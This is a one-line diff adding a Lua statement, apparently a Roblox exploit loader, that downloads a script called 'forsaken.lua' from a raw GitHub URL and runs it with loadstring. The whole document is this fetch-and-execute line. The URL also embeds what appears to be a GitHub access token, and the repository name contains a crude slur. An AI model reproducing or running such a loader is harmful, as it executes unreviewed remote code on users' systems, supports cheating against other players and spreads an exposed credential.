@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/06nk/lzovs-slut/refs/heads/main/forsaken.lua?token=GHSAT0AAAAAAC7FMB4CZX4GT2LIEVWAH45Q2AV67SQ"))()
